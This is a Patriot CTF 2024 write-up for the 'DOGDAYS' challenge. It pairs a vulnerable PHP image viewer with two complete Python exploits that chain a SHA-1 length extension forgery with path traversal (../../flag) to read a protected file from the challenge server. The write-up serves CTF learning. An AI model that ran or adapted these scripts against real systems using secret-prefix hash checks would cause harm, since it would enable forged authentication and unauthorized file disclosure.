# DOGDAYS Patriot CTF 2024

@phulelouch

### Problem:

```
<?php
	$pic = $_GET['pic'];
	$hash = $_GET['hash'];
	if(sha1("TEST SECRET1".$pic)==$hash){
		$imgdata = base64_encode(file_get_contents("pupper/".str_replace("\0","",$pic)));
		echo "<!DOCTYPE html>";
		echo "<html><body><h1>Here's your picture:</h1>";
		echo "<img src='data:image/png;base64,".$imgdata."'>";
		echo "</body></html>";
	}else{
		echo "<!DOCTYPE html><html><body>";
		echo "<h1>Invalid hash provided!</h1>";
		echo '<img src="assets/BAD.gif"/>';
		echo "</body></html>";
	}
	// The flag is at /flag, that's all you're getting!
?>

```

### Way of thinking :

This is a sha1 length extension attack. I already know this vulnerability before so I realize it

I won't try to explain it because LiveOverflow's video explain it better than anyone else. And the situation is the same as the video. https://www.youtube.com/watch?v=6QQ4kgDWQ9w

But in this case we just need to get to ../../../../../../../flag

### Solution:

The code is in dogdays\_exploit.py

![alt text](<Screenshot 2024-09-23 at 4.03.15 PM.png>)

### Exploit:

```python
import requests
import urllib.parse
import struct
import sys
import re
import base64

base_url = 'http://chal.competitivecyber.club:7777/view.php' 

original_pic = '1.png'  
original_hash = '06dadc9db741e1c2a91f266203f01b9224b5facf'  

# The data you want to append (the payload)
append_data = '../../../../../../../../flag' 

# Function to extract the base64 data from the HTML response
def extract_base64_data(html_content):
    pattern = r"data:image/png;base64,([A-Za-z0-9+/=]+)"
    match = re.search(pattern, html_content)
    if match:
        return match.group(1)
    else:
        return None

class SHA1:
    def __init__(self):
        self.h0 = 0x67452301
        self.h1 = 0xEFCDAB89
        self.h2 = 0x98BADCFE
        self.h3 = 0x10325476
        self.h4 = 0xC3D2E1F0
        self.message_byte_length = 0
        self._unprocessed = b''

    def set_state(self, h):
        self.h0, self.h1, self.h2, self.h3, self.h4 = h

    def set_message_length(self, length):
        self.message_byte_length = length

    def update(self, arg):
        self._unprocessed += arg
        self.message_byte_length += len(arg)
        while len(self._unprocessed) >= 64:
            self._handle(self._unprocessed[:64])
            self._unprocessed = self._unprocessed[64:]

    def _left_rotate(self, n, b):
        return ((n << b) | (n >> (32 - b))) & 0xffffffff

    def _handle(self, chunk):
        w = list(struct.unpack('>16I', chunk)) + [0]*64
        for i in range(16, 80):
            w[i] = self._left_rotate(w[i-3] ^ w[i-8] ^ w[i-14] ^ w[i-16], 1)

        a = self.h0
        b = self.h1
        c = self.h2
        d = self.h3
        e = self.h4

        for i in range(80):
            if 0 <= i <= 19:
                f = (b & c) | (~b & d)
                k = 0x5A827999
            elif 20 <= i <= 39:
                f = b ^ c ^ d
                k = 0x6ED9EBA1
            elif 40 <= i <= 59:
                f = (b & c) | (b & d) | (c & d)
                k = 0x8F1BBCDC
            elif 60 <= i <= 79:
                f = b ^ c ^ d
                k = 0xCA62C1D6
            temp = (self._left_rotate(a, 5) + f + e + k + w[i]) & 0xffffffff
            e = d
            d = c
            c = self._left_rotate(b, 30)
            b = a
            a = temp

        self.h0 = (self.h0 + a) & 0xffffffff
        self.h1 = (self.h1 + b) & 0xffffffff
        self.h2 = (self.h2 + c) & 0xffffffff
        self.h3 = (self.h3 + d) & 0xffffffff
        self.h4 = (self.h4 + e) & 0xffffffff

    def hexdigest(self):
        message_byte_length = self.message_byte_length
        message = self._unprocessed
        message += b'\x80'
        message += b'\x00' * ((56 - (message_byte_length + 1) % 64) % 64)
        message_bit_length = message_byte_length * 8
        message += struct.pack('>Q', message_bit_length)
        while len(message) >= 64:
            self._handle(message[:64])
            message = message[64:]
        return '{:08x}{:08x}{:08x}{:08x}{:08x}'.format(
            self.h0, self.h1, self.h2, self.h3, self.h4)

def sha1_length_extension_attack(original_hash, original_data, append_data, secret_length_guess):
    h = struct.unpack('>5I', bytes.fromhex(original_hash))
    total_length = secret_length_guess + len(original_data)
    original_padding = sha1_padding(total_length)
    new_sha1 = SHA1()
    new_sha1.set_state(h)
    new_sha1.set_message_length(total_length + len(original_padding))
    new_sha1.update(append_data.encode())
    new_hash = new_sha1.hexdigest()
    new_pic = original_data.encode() + original_padding + append_data.encode()
    return new_hash, new_pic


def sha1_padding(message_length):
    ml = message_length * 8
    padding = b'\x80'
    padding += b'\x00' * ((56 - (message_length + 1) % 64) % 64)
    padding += struct.pack('>Q', ml)
    return padding

for secret_length in range(6, 20): # I know it's 12 for the "TEST SECRET1" but I don't know if it really is the key so :v
    print(f"Trying secret length: {secret_length}")
    try:
        new_hash, new_pic_bytes = sha1_length_extension_attack(
            original_hash, original_pic, append_data, secret_length
        )
        new_pic_encoded = urllib.parse.quote_from_bytes(new_pic_bytes)
        url = f"{base_url}?pic={new_pic_encoded}&hash={new_hash}"
        response = requests.get(url)
        if "Here's your picture" in response.text:
            print(response.text)
            print(url)
            print(f"Success with secret length {secret_length}")
            base64_data = extract_base64_data(response.text)
            if base64_data:
                flag_content = base64.b64decode(base64_data)
                print("Flag found:")
                print(flag_content.decode())
                break
            else:
                print("Base64 data not found in the response.")
        else:
            print("Attempt failed.")
    except Exception as e:
        print(f"An error occurred: {e}")
```

### Reference:

https://github.com/nicolasff/pysha1 https://github.com/amlweems/hexpand

This code look cleaner than mine

```
import httpx
import HashTools
from os import urandom
import urllib.parse
import re
import base64

URL = "http://chal.competitivecyber.club:7777"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.Client(base_url=url)
        self.pic = ""
        self.hash = ""
    def triggerlfi(self):
        print(f'[x] pic : {self.pic}')
        print(f'[x] hash : {self.hash}')
        resp = self.c.get(f'{URL}/view.php?pic={self.pic}&hash={self.hash}')
        parsed = re.findall(r"base64,(.*)'>", resp.text)
        print(base64.b64decode(parsed[0]).decode())
        # print(f'{URL}/view.php?pic={self.pic}&hash={self.hash}') 
    
        
    def attackHash(self, payload: str):
        original_data = b"2.png"
        sig = "6e52c023e823622a86e124824efbce29d78b2e73"
        # attack
        append_data = payload.encode()
        magic = HashTools.new("sha1")
        new_data, new_sig = magic.extension(
            secret_length=12, original_data=original_data,
            append_data=append_data,
            signature=sig
        )
        new_data_hex = new_data.hex()
        self.pic = urllib.parse.quote(bytes.fromhex(new_data_hex))
        self.hash = new_sig
        
class API(BaseAPI):
    ...

if __name__ == "__main__":
    api = API()
    api.attackHash("../../../../../../flag")
    api.triggerlfi()
```
